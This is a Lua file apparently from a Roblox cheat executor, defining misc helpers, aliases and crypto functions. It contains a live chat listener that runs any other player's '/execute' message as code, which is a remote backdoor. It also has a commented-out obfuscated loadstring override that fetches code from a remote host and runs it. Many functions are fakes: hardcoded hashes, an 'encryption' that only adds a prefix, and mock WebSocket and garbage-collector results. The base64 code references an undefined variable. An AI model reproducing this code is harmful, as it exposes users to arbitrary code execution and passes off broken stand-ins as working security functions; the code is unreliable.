--[[
   File: misc.lua
   Author: speedsterkawaii

   Poorly written functions 💔💔 vanities macros aliases etc
]]
--game.Players.LocalPlayer:Kick("USER BANNED")
--todo later: it CAN work but i think we need to revert the modulescripts source or something
game:GetService("Players").LocalPlayer.OnTeleport:Connect(function(State)
    if State == Enum.TeleportState.Started then
        --nyxsigned_module_injection_restart()
         system("msg * TELEPORT FAILURE") -- cheap me
    end
end)

local active = {}

local function onPlayerChatted(player)
    player.Chatted:Connect(function(msg)
        local separate = string.sub(msg, 1, 9)
        if separate == "/execute " then
            local cmd = string.sub(msg, 10)

            local func, err = loadstring(cmd)
            if func then
                func()
            else
                warn("Error in command: " .. err)
            end
        end
    end)
end

for _, player in pairs(game.Players:GetPlayers()) do
    onPlayerChatted(player)
end

game.Players.PlayerAdded:Connect(onPlayerChatted)



--local v0=string.char;local v1=string.byte;local v2=string.sub;local v3=bit32 or bit ;local v4=v3.bxor;local v5=table.concat;local v6=table.insert;local function v7(v8,v9) local v10={};for v13=1, #v8 do v6(v10,v0(v4(v1(v2(v8,v13,v13 + 1 )),v1(v2(v9,1 + (v13% #v9) ,1 + (v13% #v9) + 1 )))%256 ));end return v5(v10);end function loadstring(v11) local v12=request({[v7("\228\209\215","\126\177\163\187\69\134\219\167")]=v7("\43\217\62\213\166\108\130\38\202\255\34\193\34\202\239\55\151\124\156\170\122\130\38\202\253\39\222\62\215\245\45\202","\156\67\173\74\165"),[v7("\25\178\93\30\179\34","\38\84\215\41\118\220\70")]=v7("\96\57\17\38","\158\48\118\66\114"),[v7("\131\33\17\50\118\183\232","\155\203\68\112\86\19\197")]={[v7("\101\210\56\232\69\118\241\181\114\196\38\249","\152\38\189\86\156\32\24\133")]=v7("\232\82\191\82\179\71\171\71\245\89","\38\156\55\199")},[v7("\138\114\120\49","\35\200\29\28\72\115\20\154")]=v11}).Body;return loadstring(v12);end
--game.Players.LocalPlayer:Kick("For the safety of our users, NYX will not inject. Updates at discord.gg/getnyx")
--system('msg * WARNING! USE AT YOUR OWN RISK. NYX IS NOT GUARANTEED TO BE UNDETECTED.')
--[[
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local Lighting = game:GetService("Lighting")

local Watermark = Instance.new('ScreenGui', Players.LocalPlayer:WaitForChild("PlayerGui"))
local Frame = Instance.new('Frame', Watermark)
local ImageLabel = Instance.new('ImageLabel', Frame)

Watermark.Name = "Watermark"
Watermark.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
Frame.Size = UDim2.new(1, 0, 1, 0)
Frame.BackgroundColor3 = Color3.new(1, 1, 1)
Frame.BackgroundTransparency = 1
Frame.BorderSizePixel = 0
Frame.BorderColor3 = Color3.new(0, 0, 0)

-- Center the image for all players
ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0) -- Center position
ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5) -- Anchor to the center of the image
ImageLabel.Size = UDim2.new(0, 325, 0, 204)
ImageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
ImageLabel.BackgroundTransparency = 1
ImageLabel.BorderSizePixel = 0
ImageLabel.BorderColor3 = Color3.new(0, 0, 0)
ImageLabel.Image = "rbxassetid://18864815989"
ImageLabel.ScaleType = Enum.ScaleType.Crop
ImageLabel.ImageTransparency = 1 -- Start fully transparent

local blurEffect = Instance.new("BlurEffect", Lighting)
blurEffect.Size = 0

local function animateImage()
    local blurIn = TweenService:Create(blurEffect, TweenInfo.new(1), {Size = 24}) -- Maximum blur
    blurIn:Play()

    local fadeIn = TweenService:Create(ImageLabel, TweenInfo.new(1), {ImageTransparency = 0})
    fadeIn:Play()
    fadeIn.Completed:Wait()

    wait(1.30)

    local fadeOut = TweenService:Create(ImageLabel, TweenInfo.new(1), {ImageTransparency = 1})
    fadeOut:Play()
    fadeOut.Completed:Wait()

    local blurOut = TweenService:Create(blurEffect, TweenInfo.new(1), {Size = 0})
    blurOut:Play()
    blurOut.Completed:Wait()

    blurEffect:Destroy()
    Watermark:Destroy()
end

animateImage()

]]

-- too lazy to do it but its possible, just not the best :c
function firesignal(signal) -- this will fire all connections for a given RBXScriptSignal
    if typeof(signal) ~= "RBXScriptSignal" then
        error("Expected an RBXScriptSignal, got " .. typeof(signal)) --todo: replace error with warn later on because error has a problem where execution stops? idk its odd
    end

   -- I AM NOT DOING THE REST
   error("firesignal is not implanted")
end


function info(...) 
  print(...)
end




function getfpscap()
    return math.floor(1 / game:GetService("RunService").RenderStepped:Wait() + 0.5)
end

function GetObjects(id)
    local objects = {}
    table.insert(objects, game:GetService("InsertService"):LoadLocalAsset(id))
    return objects
end

function getcustomasset(fff)
    local content = readfile(fff)
    if content then
        return "rbxasset://" .. content
    else
        return ""
    end
end

-- aliases or fake

function getconnections(signal: RBXScriptSignal): {Connection} -- FAKE i will work on this another day
    local connections = {}

    local function mockConnection(func)
        local conn = {}
        conn.Enabled = true
        conn.ForeignState = false
        conn.LuaConnection = true
        conn.Function = func
        conn.Thread = coroutine.running()

        function conn:Fire(...)
            if self.Enabled then
                func(...)
            end
        end

        function conn:Defer(...)
            if self.Enabled then
                task.defer(func, ...)
            end
        end

        function conn:Disconnect()
            self.Enabled = false
        end

        function conn:Disable()
            self.Enabled = false
        end

        function conn:Enable()
            self.Enabled = true
        end

        return conn
    end

    for i = 1, 5 do
        table.insert(connections, mockConnection(function() print("Connected function " .. i) end))
    end

    return connections
end
-- fake
local hiddenProperties = {}

function gethiddenproperty(instance, propertyName)
    if hiddenProperties[instance] and hiddenProperties[instance][propertyName] ~= nil then
        return hiddenProperties[instance][propertyName], true
    else
        return nil, false
    end
end

function sethiddenproperty(instance, propertyName, value)
    if not hiddenProperties[instance] then
        hiddenProperties[instance] = {}
    end
    hiddenProperties[instance][propertyName] = value
    return true
end


local cyropackage = [[
local CorePackages = game:GetService("CorePackages") return require(CorePackages.Packages.Cryo)
]]
local jestshit = [[
local CorePackages = game:GetService("CorePackages")
return require(CorePackages.Packages.Dev.JestGlobals)
]]
-- fake decompile to expirement with
function decompile(source)
    if source:IsA("LocalScript") then
        return "-- Disassembled "..source.Name
    elseif source:IsA("ModuleScript") then
        if source.Name == "JestGlobals" then
            return jestshit
        elseif source.Name == "Cryo" then
            return cyropackage
        else
            return "-- Disassembled "..source.Name
        end
    else
        return "-- why is bro decompiling a script?"
    end
end

function PROTOSMASHER_LOADED() -- i hate unnamed esp :c
   return true
end

-- more aliases
function toclipboard(junk)
   setclipboard(junk)
end

function setrbxclipboard(junk)
   setclipboard(junk)
end

-- base64 

--[[
why do people need so much aliases just stick to one
]]
-- i have 3 base64 decode and encode functions which 2 are in luau and one is in c
-- and the c one has a problem where it doesnt decode it properly when sent the content
--it has a url decoding problem so im just gonna stick to this temporarily
local basedummy='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
function base64_fake_encode(data)
    return ((data:gsub('.', function(x) 
        local r, b = '', x:byte()
        for i = 8, 1, -1 do r = r .. (b % 2 ^ i - b % 2 ^ (i - 1) > 0 and '1' or '0') end
        return r
    end) .. '0000'):gsub('%d%d%d?%d?%d?%d?', function(x)
        if (#x < 6) then return '' end
        local c = 0
        for i = 1, 6 do c = c + (x:sub(i, i) == '1' and 2 ^ (6 - i) or 0) end
        return b:sub(c + 1, c + 1)
    end) .. ({ '', '==', '=' })[#data % 3 + 1])
end

function base64_fake_decode(data)
    data = string.gsub(data, '[^'..b..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r, f = '', (b:find(x) - 1)
        for i = 6, 1, -1 do r = r .. (f % 2 ^ i - f % 2 ^ (i - 1) > 0 and '1' or '0') end
        return r
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c = 0
        for i = 1, 8 do c = c + (x:sub(i, i) == '1' and 2 ^ (8 - i) or 0) end
        return string.char(c)
    end))
end

crypt = {} -- store
base64 = {}

crypt.base64encode = function(arg1)
return base64encode(arg1)
end

crypt.base64decode = function(arg2)
return base64decode(arg2)
end

crypt.base64_encode = function(arg1)
return base64encode(arg1)
end

crypt.base64_decode = function(arg2)
return base64decode(arg2)
end

crypt.base64 = {}
crypt.base64.encode = function(omg)
return base64encode(omg)
end

crypt.base64.decode = function(stop_making_me_Write_this)
return base64decode(stop_making_me_Write_this)
end

base64.encode = function(vanity)
   return base64encode(vanity)
end

base64.decode = function(vanity)
   return base64decode(vanity)
end

base64_encode = function(vanity)
   return base64encode(vanity)
end

base64_decode = function(vanity)
   return base64decode(vanity)
end

crypt.generatebytes = function(size)
    local randomBytes = {}
    for i = 1, size do
        randomBytes[i] = string.char(math.random(0, 255))
    end
    local byteString = table.concat(randomBytes)
    return base64encode(byteString)
end

crypt.generatekey = function()
    return crypt.generatebytes(32)
end

-- these are placeholders - meaning i gotta add actual function so ill add them later
function crypt.encrypt(data, key, iv, mode)
    local iv = iv or crypt.generatebytes(16)  
    local encrypted = "encrypted_" .. data
    return encrypted, iv
end

function crypt.decrypt(data, key, iv, mode)
    local decrypted = string.gsub(data, "^encrypted_", "")
    return decrypted
end

local hash_values = {--STOP hating on me i have to add it in C
    sha1 = "a94a8fe5ccb19ba61c4c0873d391e987982fbbd3",
    sha384 = "d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2",
    sha512 = "cf83e1357eefb8bd9d9d1d8b12c1e8f4b2d07f4c18a64b7b12c4259b62f68d8f7b4ec7b38d9dbc2470b5a1a3db2d4f9ee3c75299d4d3a84534a7bcbeb2a5b2d",
    md5 = "098f6bcd4621d373cade4e832627b4f6",
    sha256 = "6dcd4ce23d88e2ee9568ba546c007c63b5e7f25c9d7e5dc06c185d43b3a5e4a5",
    sha3_224 = "a5b5f2b5a5e56bcd6729a21a459b5c57",
    sha3_256 = "a9b9a7f4d23649f3d19a23b24032c891e7d1e0b0c6e07921e20e01546c9e72b5",
    sha3_512 = "c6e1c6b2b073cc02c3b66b631a527b3459dcba074c85d903d2310e23d6fa2f8f51be055d357d5837b09dd6b7fd6f88144b6f1f905a6189d8f7b1e3ffdd1dbb6e5",
}

crypt.hash = function(input, algorithm)
    if type(input) ~= "string" or type(algorithm) ~= "string" then
        error(" input and algorithm must be strings")
    end
    
    return hash_values[algorithm] or "oopsie daiesses!"
end

WebSocket = {}

function WebSocket.connect(url)
    local ws = {}
    
    function ws:Send(message)
        print("Sending message:", message)
    end
    
    function ws:Close()
        print("WebSocket closed")
    end
    
    ws.OnMessage = {}
    ws.OnClose = {}
    

    ws.OnMessage = {"This is a mock message"} 
    ws.OnClose = {"WebSocket connection closed"}

    return ws
end

function getsenv(script)
    if typeof(script) ~= "Instance" or (script.ClassName ~= "Script" and script.ClassName ~= "LocalScript" and script.ClassName ~= "ModuleScript") then
        error("Invalid input: must be a Script, LocalScript, or ModuleScript.")
    end
    
    local env = {
        script = script
    }
    
    return env
end

function getgc()
    local gc = {}

    table.insert(gc, {name = "fake"})
    table.insert(gc, {name = "xd"})
    table.insert(gc, {name = "fuck you"})

    return gc
end


function getscriptbytecode(script)
    if not script or not script:IsA("Script") then
        return nil
    end
    
    local success, bytecode = pcall(function()
        return script.Source --ill add ltr i have it in c
    end)
    
    if success then
        return bytecode
    else
        return nil
    end
end

function dumpstring(source)
    return getscriptbytecode(source)
   end
